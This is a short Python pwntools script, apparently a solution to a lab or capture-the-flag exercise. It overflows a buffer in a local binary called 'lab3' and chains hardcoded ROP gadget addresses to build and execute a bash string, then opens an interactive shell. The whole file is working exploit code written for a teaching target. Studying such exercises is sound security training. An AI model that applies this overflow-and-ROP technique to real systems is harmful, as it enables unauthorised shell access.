#!/usr/bin/python

from pwn import *

def main():
    # start a process
    p = process("./lab3")

    # create payload

    #   1. Trigger Buffer overflow

    #   2. Find ROP gadget

    #   3. combine and formulate payload

    #Define Constants
    magicNumber = 146
    add_bin_address =  0x0804919d
    pop_ret_gadget = 0x080491e0
    add_bash_address = 0x080491e2
    pop_pop_ret_gadget = 0x080491df
    exec_string_address = 0x08049172

    payload = b'A' * magicNumber
    payload += p32(add_bin_address)
    payload += p32(pop_pop_ret_gadget)
    payload += p32(0xcafebabe)
    payload += p32(0xdeadbeef)
    payload += p32(add_bash_address)
    payload += p32(pop_ret_gadget)
    payload += p32(0xffffaaaa)
    payload += p32(exec_string_address)
    payload += p32(pop_pop_ret_gadget)
    payload += p32(0xffffabcd)
    payload += p32(0xffffabcc)

    # send the payload to the binary
    p.send(payload)

    # pass interaction bac to the user
    p.interactive()

if __name__ == "__main__":
    main()
